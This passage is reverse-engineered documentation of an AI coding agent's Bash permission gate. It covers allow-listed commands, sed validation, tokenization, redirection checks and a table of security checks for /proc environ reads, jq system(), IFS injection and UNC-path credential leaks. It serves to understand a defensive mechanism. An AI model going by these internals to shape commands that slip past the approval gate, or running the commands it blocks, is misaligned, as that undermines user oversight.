2. **`fcY` (SAFE_COMMAND_PATTERNS)** — Set of regex patterns for trivially safe commands
3. **`WcY` (isInSafeCommandRegistry)** — checks command against the registry
4. **`NcY` (isReadOnlyCommand)** — comprehensive read-only decision
5. **`Of6` (checkReadOnlyBehavior)** — main permission gate

### isInSafeCommandRegistry (WcY)

**What it does:** Checks whether a command exactly matches a known-safe command with approved flags only.

**How it works:**

```javascript
// ============================================
// isInSafeCommandRegistry - Flag-level safe command validation
// Location: chunks.150.mjs:680
// ============================================

// READABLE (for understanding):
function isInSafeCommandRegistry(command) {
    // Remove trailing "2>&1" (safe redirect)
    let trimmed = command.trim();
    if (trimmed.endsWith(" 2>&1")) trimmed = trimmed.slice(0, -5).trim();

    // Skip Windows UNC paths (\\server\share) — not a security concern but flagged
    if (isWindowsUncPath(trimmed)) return false;

    // Skip commands with glob patterns (* ? [ ]) — can't safely validate
    if (containsGlobPattern(trimmed)) return false;

    // Check against registry
    if (isRegistryMatch(trimmed)) return true;

    // Check against regex patterns (simple commands like pwd, echo, etc.)
    for (let pattern of SAFE_COMMAND_PATTERNS)
        if (pattern.test(trimmed)) {
            // Special git exceptions
            if (trimmed.includes("git") && /\s-c[\s=]/.test(trimmed)) return false;    // git -c configures
            if (trimmed.includes("git") && /\s--exec-path[\s=]/.test(trimmed)) return false;
            if (trimmed.includes("git") && /\s--config-env[\s=]/.test(trimmed)) return false;
            return true;
        }
    return false;
}
```

**Registry matching logic (isRegistryMatch / WcY core):**
1. Tokenize command via `shellTokenize` (pz)
2. Convert tokens to strings (treating globs as their pattern)
3. Find the longest matching prefix in `SAFE_COMMAND_REGISTRY`
4. For each remaining token: validate it's an approved flag with appropriate argument type
5. Special handling for combined flags (`-nA` = `-n` + `-A`)
6. Check `additionalCommandIsDangerousCallback` if defined (e.g., for `git branch`)

**Flag type system:**
| Type | Meaning |
|------|---------|
| `"none"` | Flag takes no argument |
| `"string"` | Flag takes a string argument (checked for leading `-`) |
| `"number"` | Flag takes a numeric argument |
| `"char"` | Flag takes a single character |
| `"EOF"` | Flag takes "EOF" specifically |
| `"{}"` | Flag takes "{}" specifically |

**Special cases in WcY:**
- `git -n NUMBER`: git supports `-N` numeric flags (git log -5)
- `grep`/`rg` combined flags: `-A5` is treated as `-A` + `5`
- `git ls-remote URL`: URLs with `://`, `@`, `:` are rejected (external network call)

### SAFE_COMMAND_REGISTRY (jcY) — Full Command List

The registry covers:
- `xargs` — with safe parallelism/batch flags
- `git diff`, `git log`, `git show`, `git shortlog`, `git reflog` — read-only git views
- `git stash list`, `git stash show` — stash inspection
- `git ls-remote`, `git ls-files` — listing
- `git status`, `git blame`, `git grep` — working tree queries
- `git config --get` — config reading (not writing)
- `git remote show`, `git remote` — remote info (view only)
- `git merge-base`, `git rev-parse`, `git rev-list` — commit graph queries
- `git describe`, `git cat-file` — object inspection
- `git for-each-ref`, `git tag` — ref listing (read-only flags only)
- `git branch` — branch listing (with `additionalCommandIsDangerousCallback` to block modifications)
- `git worktree list` — worktree info
- Docker read commands: `docker ps`, `docker images`, `docker stats`, `docker diff`, `docker port`
- `docker compose ps`, `docker compose top`, `docker compose config`, `docker compose logs`
- `docker logs`, `docker inspect`

### SAFE_COMMAND_PATTERNS (fcY) — Regex Allow-List

Simple commands that are always safe regardless of arguments:

```
ZcY (simple list): cal, uptime, cat, head, tail, wc, stat, strings, hexdump,
  od, nl, id, uname, free, df, du, locale, groups, nproc, docker ps, docker images,
  basename, dirname, realpath, cut, paste, tr, column, tac, rev, fold, expand,
  unexpand, readlink, diff, true, false, sleep, which, type

Specific patterns:
- echo (safe without separators, no $)
- claude -h / claude --help
- uniq with common flags
- pwd
- whoami
- node -v / npm -v / python --version / python3 --version
- history [N]
- alias
- arch [--help]
- ip addr
- ifconfig [interface]
- jq (without dangerous flags)
- cd [path]
- ls [args]
- find (without -exec, -delete, -ok, -fprint)
```

### isReadOnlyCommand (NcY)

**What it does:** Comprehensive check that combines multiple approaches to determine if a command is read-only.

```javascript
// ============================================
// isReadOnlyCommand - Comprehensive read-only check
// Location: chunks.150.mjs:831
// ============================================
function isReadOnlyCommand(command) {
    let trimmed = command.trim();
    if (trimmed.endsWith(" 2>&1")) trimmed = trimmed.slice(0, -5).trim();

    // Windows UNC paths → not read-only (external network)
    if (isWindowsUncPath(trimmed)) return false;

    // Glob patterns → can't safely validate
    if (containsGlobPattern(trimmed)) return false;

    // Registry match → read-only confirmed
    if (isInSafeCommandRegistry(trimmed)) return true;

    // Pattern match → read-only confirmed (with git exceptions)
    for (let pattern of SAFE_COMMAND_PATTERNS)
        if (pattern.test(trimmed)) {
            if (trimmed.includes("git") && /\s-c[\s=]/.test(trimmed)) return false;
            if (trimmed.includes("git") && /\s--exec-path[\s=]/.test(trimmed)) return false;
            if (trimmed.includes("git") && /\s--config-env[\s=]/.test(trimmed)) return false;
            return true;
        }
    return false;
}
```

### checkReadOnlyBehavior (Of6)

**What it does:** The main permission gate for Bash tool calls. Determines if a command can be auto-allowed as a read-only operation.

```javascript
// ============================================
// checkReadOnlyBehavior - Main read-only permission gate
// Location: chunks.150.mjs:881
// ============================================

// ORIGINAL (for source lookup):
function Of6(A, q) {
    let { command: K } = A;
    if (!pz(K, (H) => `$${H}`).success) return { behavior: "passthrough", ... };
    if (lm(K).behavior !== "passthrough") return { behavior: "passthrough", ... };
    if ($f6(K)) return { behavior: "ask", message: "Windows UNC path (WebDAV attack)" };
    let z = vcY(K);
    if (q && z) return { behavior: "passthrough", ... };  // cd+git compound with prompt
    if (z && EcY()) return { behavior: "passthrough", ... };  // git in bare repo
    if (AD(K).every((H) => { if (lm(H).behavior !== "passthrough") return !1; return NcY(H) }))
        return { behavior: "allow", updatedInput: A };
    return { behavior: "passthrough", ... }
}

// READABLE (for understanding):
function checkReadOnlyBehavior(toolInput, hasPromptContext) {
    let { command } = toolInput;

    // Must be parseable
    if (!shellTokenize(command).success)
        return { behavior: "passthrough", message: "Cannot parse, needs permission check" };

    // Must pass static security checks
    if (runSecurityChecks(command).behavior !== "passthrough")
        return { behavior: "passthrough", message: "Not read-only, needs permission check" };

    // Windows UNC path → potential WebDAV attack
    if (isWindowsUncPath(command))
        return { behavior: "ask", message: "Windows UNC path" };

    let hasGit = containsGitSubcommand(command);

    // Compound cd + git with user prompt context → needs permission check
    if (hasPromptContext && hasGit)
        return { behavior: "passthrough", message: "cd+git compound needs check" };

    // Git in bare repo structure → might affect git objects
    if (hasGit && isBareGitRepo())
        return { behavior: "passthrough", message: "git in bare repo needs check" };

    // All subcommands must be read-only
    if (extractSubcommands(command).every(sub =>
        runSecurityChecks(sub).behavior === "passthrough" && isReadOnlyCommand(sub)))
        return { behavior: "allow", updatedInput: toolInput };

    return { behavior: "passthrough", message: "Not read-only, needs permission check" };
}

// Mapping: Of6→checkReadOnlyBehavior, lm→runSecurityChecks, $f6→isWindowsUncPath,
//   vcY→containsGitSubcommand, EcY→isBareGitRepo, AD→extractSubcommands, NcY→isReadOnlyCommand
```

**Decision flow:**
```
command parseable?     NO  → passthrough (needs normal check)
     │ YES
security passes?       NO  → passthrough
     │ YES
Windows UNC path?      YES → ask
     │ NO
has git + prompt ctx?  YES → passthrough (conservative for cd+git)
     │ NO
git in bare repo?      YES → passthrough
     │ NO
all subcommands RO?    YES → allow (auto-approve)
     │ NO
                       → passthrough
```

### Windows UNC Path Detection ($f6)

**What it does:** Detects Windows UNC paths (`\\server\share`) on Windows systems, which can trigger WebDAV requests to attacker-controlled SMB servers.

**Attack:** When git is run with a UNC path on Windows, it may send NTLM authentication credentials to the attacker's SMB server. This is a well-known Windows-specific attack vector.

---

## Sed Validation Subsystem

The sed validation is one of the most complex subsystems — a complete mini-parser for sed commands.

### Architecture

```
sed command
    │
    ├─ extractSedExpressions (XcY) ── finds -e scripts
    │                                  and first positional arg
    ├─ sedHasFileRedirection (JcY) ── detects -e that reads files
    │
    ├─ isSafeReadOnlySed (OcY) ─────  validates read patterns (p)
    │
    ├─ isSafeSubstituteSed (J6q) ─── validates s/ substitution
    │
    └─ isDangerousSedExpression (DcY) ─ validates individual expressions
```

### extractSedExpressions (XcY)

**What it does:** Extracts all sed script expressions from a sed command (from `-e` flags and the first positional argument).

**Algorithm:**
1. Match `sed ` prefix
2. Reject dangerous flag combinations: `-ew`, `-we`, `-wE` (write + expression combinations)
3. Tokenize the remaining part
4. Walk tokens:
   - `-e EXPR` or `--expression=EXPR` → add to expressions
   - First non-flag, non-`-e` argument → implicit expression (if no `-e` was seen)
5. Return expression list

### isDangerousSedExpression (DcY)

**What it does:** Validates an individual sed expression for safety. Returns `true` if dangerous.

**Checks performed:**
1. Non-ASCII characters → dangerous
2. `{` or `}` in expression → might be compound command
3. Contains literal newline → multi-line sed script
4. `#` comment that's not preceded by `s` (the `s` command can have `#` in pattern) → dangerous
5. `!` addressing (negative address): `!p`, `/pat/!d`
6. `~` step addressing: `0~2p` (every other line)
7. Leading `,` (range from line 0)
8. `,+N` or `,-N` relative range
9. `s\\` or `\\|` or `\\%` or `\\@` (alternate substitution delimiters)
10. `\\/.../w` (write to file within regex)
11. `/pattern  w FILE` (write flag in sed expression)
12. Malformed `s/` expression (not exactly `s/PATTERN/REPLACE/FLAGS`)
13. `w` or `W` flags in substitution → writes to file
14. `e` or `E` flags in substitution → executes shell command
15. `y///` with write/execute flags

**Why this complexity?** Sed has dozens of commands and features. The validation must handle:
- Multiple addressing forms (`N`, `N,M`, `/pat/`, `/pat/,/pat2/`, `N~M`)
- Multiple command forms (`p`, `d`, `s///`, `y///`, `q`, etc.)
- Multiple flag forms per command
- File-writing commands (`w`, `W`)
- Shell execution commands (`e`, `R`)

### validateSedCommand (QU1)

**What it does:** The master sed validation function — combines all sed sub-checks.

```javascript
// ============================================
// validateSedCommand - Master sed safety check
// Location: chunks.150.mjs:493
// ============================================
function validateSedCommand(command, options) {
    let allowFileWrites = options?.allowFileWrites ?? false;

    try {
        let expressions = extractSedExpressions(command);  // may throw
        let hasFileRedirection = sedHasFileRedirection(command);

        let isReadOnly = false, isSafeSubstitute = false;
        if (allowFileWrites) {
            isSafeSubstitute = isSafeSubstituteSed(command, expressions, hasFileRedirection,
                                                    { allowFileWrites: true });
        } else {
            isReadOnly = isSafeReadOnlySed(command, expressions);
            isSafeSubstitute = isSafeSubstituteSed(command, expressions, hasFileRedirection);
        }

        if (!isReadOnly && !isSafeSubstitute) return false;

        // Additional expression-level checks
        for (let expr of expressions) {
            if (isSafeSubstitute && expr.includes(";")) return false;
        }
        for (let expr of expressions) {
            if (isDangerousSedExpression(expr)) return false;
        }

        return true;
    } catch { return false; }
}
```

**Integration with permissions:**
```javascript
// checkSedCommand (D6q) — called from permission system:
function checkSedCommand(toolInput, permissionMode) {
    let subcommands = extractSubcommands(toolInput.command);
    for (let sub of subcommands) {
        if (!sub.trim().split(/\s+/)[0] === "sed") continue;
        let allowFileWrites = permissionMode.mode === "acceptEdits";
        if (!validateSedCommand(sub, { allowFileWrites }))
            return { behavior: "ask", message: "sed requires approval" };
    }
    return { behavior: "passthrough" };
}
```

**The `allowFileWrites` distinction:** In "accept edits" mode (when the user has pre-approved file modifications), `sed -i` (in-place editing) is allowed. In standard mode, only read-only `sed` patterns are permitted.

---

## Shell Tokenization Layer

### parseShellCommand (rZ1) — Sentinel-Based Tokenization

**What it does:** Converts a shell command string into a list of tokens, while safely handling heredocs, escaped characters, and special quoting that would confuse the underlying tokenizer.

**Algorithm:**
1. Generate random sentinels (collision-safe placeholders)
2. Extract heredocs → `processedCommand` (heredocs replaced with `__HEREDOC_N_HEX__`)
3. Normalize line continuations (`\<newline>` → collapse)
4. Insert sentinels adjacent to quote chars:
   - `"` → `"__DOUBLE_QUOTE_HEX__` (quote char stays, sentinel marks its presence)
   - `'` → `'__SINGLE_QUOTE_HEX__`
   - `\n` → `\n__NEW_LINE_HEX__\n`
   - `\(` → `__ESCAPED_OPEN_PAREN_HEX__`
   - `\)` → `__ESCAPED_CLOSE_PAREN_HEX__`
5. Run shell tokenizer (`pz`) with variable expansion handler
6. If tokenization fails → fallback: return `[originalCommand]` with heredocs restored
7. Recombine tokens split by the NEW_LINE sentinel
8. Strip sentinel text from all tokens (restore original chars)
9. Restore heredocs from placeholders

```javascript
// ============================================
// generateSentinels - Create collision-safe placeholder strings
// Location: chunks.169.mjs:1701
// ============================================
function aOq() {
    let A = o9z(8).toString("hex");  // 8 random bytes → 16-char hex
    return {
        SINGLE_QUOTE: `__SINGLE_QUOTE_${A}__`,
        DOUBLE_QUOTE: `__DOUBLE_QUOTE_${A}__`,
        NEW_LINE: `__NEW_LINE_${A}__`,
        ESCAPED_OPEN_PAREN: `__ESCAPED_OPEN_PAREN_${A}__`,
        ESCAPED_CLOSE_PAREN: `__ESCAPED_CLOSE_PAREN_${A}__`
    }
}
```

**Why sentinel-based approach?**

The external `bash-parser` tokenizer (`pz`) consumes and removes quotes during tokenization. But the security system needs to see the original quoting to detect attacks. The sentinels preserve quote information:

```
Input:  git commit -m "Fix $(bug)"
After:  git commit -m "__DQ__Fix $(bug)__DQ__"
Tokenized: ["git", "commit", "-m", '"__DQ__Fix $(bug)__DQ__"']
After restore: ["git", "commit", "-m", '"Fix $(bug)"']
```

The security check can now see that `$(bug)` is inside a double-quoted string.

### extractSubcommands (AD)

**What it does:** Splits a compound command into individual subcommands by removing redirections and separating at `&&`, `||`, `;`, `|`.

**Algorithm:**
1. Tokenize via `rZ1` (parseShellCommand)
2. Walk tokens, removing redirect sequences:
   - `>&`, `>`, `>>` followed by a safe target → remove operator + target
   - `>&` followed by `!` or `|` → different forms of stderr redirect
   - `2>` / `1>` → file descriptor redirects
3. Filter out undefined/empty tokens and separator operators
4. Remove shell-internal tokens via `filterSeparatorTokens` (s9z)

**Key helper — isSimplePath (a9z):**
```javascript
// Checks if a redirection target is a simple, safe path
function isSimplePath(token) {
    return !token.startsWith("!") &&
           !token.includes("$") && !token.includes("`") &&
           !token.includes("*") && !token.includes("?") &&
           !token.includes("[") && !token.includes("{") &&
           !token.includes("~") && !token.includes("(") &&
           !token.includes("<") && !token.startsWith("&")
}
```

Tokens containing `$`, backtick, or shell special chars are NOT simple paths — they're dangerous variable redirections.

### reconstructCommand (wYz)

**What it does:** Rebuilds a command string from a token array. Used after `extractSubcommands` removes redirections, to get a clean printable command.

**Algorithm:**
1. Walk tokens, building a string
2. String tokens: escape if needed (quote special chars with `R7`)
3. Operator tokens: append with proper spacing
4. Track `$()` depth for parenthesis spacing
5. Handle `>&` with file descriptors: `1>&2` form
6. Handle `<<` (here-string operator)

---

## Compound Command Analysis

### hasOnlySimpleOperators (KYz)

**What it does:** Checks if a command uses only "safe" operators: pipes (`|`), sequencing (`&&`, `||`, `;`, `;;`), output redirects (`>`, `>>`), and stderr redirect (`>&`).

**Returns `false` if the command contains:** Comments (`#`), process substitution (`<(`), or any operator not in the safe set.

**Usage:** Called by `tOq` to determine if a compound command is inherently dangerous beyond injection checks.

### isCompoundDangerous (tOq)

```javascript
function tOq(A) {
    let { processedCommand } = XT6(A);
    if (!pz(processedCommand).success) return true;   // Unparseable = dangerous
    return AD(A).length > 1 && !KYz(A)               // Multiple subcommands + non-simple operators
}
```

### containsCdCommand (Pf6)

Detects if any subcommand is a `cd` command — used in `checkReadOnlyBehavior` to apply extra caution when `cd` + `git` appear in compound commands (could navigate to a directory where git operations have different security implications).

---

## Redirection Analysis

### extractRedirections (aI)

**What it does:** Analyzes all redirections in a command, classifying each as safe or dangerous.

**Algorithm:**
1. Tokenize command
2. Track process substitution contexts (`<(...)` and `>(...)`) — these are NOT simple redirections
3. Walk tokens looking for `>`, `>>`, `>&` operators
4. For each: call `checkDangerousRedirection` (YYz)
5. Return `{commandWithoutRedirections, redirections, hasDangerousRedirection}`

### checkDangerousRedirection (YYz)

**What it does:** Determines if a specific redirection is dangerous. Called with the operator token and its surrounding context.

**Return value:** `{skip: N, dangerous: boolean}` where `skip` = how many additional tokens to skip.

**Decision tree for `>` and `>>`:**

```
prev_token is digit?  (e.g., "2>" → file descriptor redirect)
  ├── next is "!" + safe_target → SAFE (fd redirect to named file)
  ├── next is "|" + safe_target → SAFE (pipe then redirect)
  ├── next is "!" + variable → DANGEROUS (fd redirect to variable)
  └── next is anything → SAFE/DANGEROUS based on target

prev_token is "|"?
  ├── next is safe_target → SAFE (skip 2: operator + target)
  └── next is variable → DANGEROUS

next is safe_target (Py)?   → SAFE (skip 1)
next is variable (DF)?      → DANGEROUS (skip 0)
```

**Decision tree for `>&`:**
```
Both prev and next are digits?  → SAFE (numeric fd redirect: 2>&1)
next is "|" + safe_target?      → SAFE
next is safe_target?            → SAFE (redirect to named file)
next is variable?               → DANGEROUS
```

**Key helper — isSafeRedirectionTarget (Py):**
```javascript
function isSafeRedirectionTarget(token) {
    return typeof token === "string" &&
           !token.startsWith("!") && !token.startsWith("~") &&
           !token.includes("$") && !token.includes("`") &&
           !token.includes("*") && !token.includes("?") &&
           !token.includes("[") && !token.includes("{")
}
```

**Key helper — containsVariable (DF):**
```javascript
function containsVariable(token) {
    return typeof token === "string" && (token.includes("$") || token.includes("%"))
}
```

---

## Security Check ID Reference

| ID | Constant Name | Check Function | Description |
|----|--------------|----------------|-------------|
| 1 | `INCOMPLETE_COMMANDS` | `rdY` | Tab/dash/operator prefix |
| 2 | `JQ_SYSTEM_FUNCTION` | `edY` | `system()` in jq |
| 3 | `JQ_FILE_ARGUMENTS` | `edY` | File-reading jq flags |
| 4 | `OBFUSCATED_FLAGS` | `$cY` | ANSI-C quoting, quoted flags |
| 5 | `SHELL_METACHARACTERS` | `AcY` | `;`, `|`, `&` in quoted args |
| 6 | `DANGEROUS_VARIABLES` | `qcY` | Variables in redirections |
| 7 | `NEWLINES` | `YcY` | Embedded newlines |
| 8 | `DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION` | `KcY` | Backticks, `$()`, `<()` |
| 9 | `DANGEROUS_PATTERNS_INPUT_REDIRECTION` | `KcY` | `<` in unquoted content |
| 10 | `DANGEROUS_PATTERNS_OUTPUT_REDIRECTION` | `KcY` | `>` in unquoted content |
| 11 | `IFS_INJECTION` | `zcY` | `$IFS` manipulation |
| 12 | `GIT_COMMIT_SUBSTITUTION` | `sdY` | `$()` in git commit message |
| 13 | `PROC_ENVIRON_ACCESS` | `wcY` | `/proc/*/environ` |
| 14 | `MALFORMED_TOKEN_INJECTION` | `HcY` | Unbalanced brackets |

---

## Summary of Design Decisions

| Decision | Rationale |
|----------|-----------|
| Allow-list before deny-list | Common safe patterns avoid expensive checks; false positive rate controlled |
| Sentinel-based tokenization | Preserves quote context that underlying tokenizer would strip |
| Heredoc placeholder extraction | Prevents heredoc content from triggering false positives in security checks |
| Random hex in all placeholders | Prevents collision with actual command content |
| LLM for prefix extraction | Shell syntax too complex for pure regex; LLM generalizes to new patterns |
| "command_injection_detected" LLM return | Defense-in-depth; LLM catches attacks that pass static checks |
| jq-mode quote stripping | jq uses `$var` in filters — double-quote preservation prevents false positives |
| Sed mini-parser | Sed has dozens of features; a comprehensive parser is necessary to avoid bypassable regex checks |
| Per-subcommand prefix extraction | Compound commands (`a && b`) need per-command prefix matching |
| `git` alone blocked as prefix | Too broad for permission matching; requires specific subcommand |
| Cached prefix extraction (qmA) | Expensive LLM call cached by command string for repeated checks |
| `git branch` additionalCallback | Most `git branch` flags are safe but branch creation/deletion is not — custom logic needed |
| Windows UNC path check | Platform-specific WebDAV attack vector; blocked even in read-only check |
| Bare git repo detection (EcY) | Git commands behave differently in bare repos; conservative block |
| jq exception in checkJqCommand (edY) | jq `system()` and file flags enable arbitrary code execution |
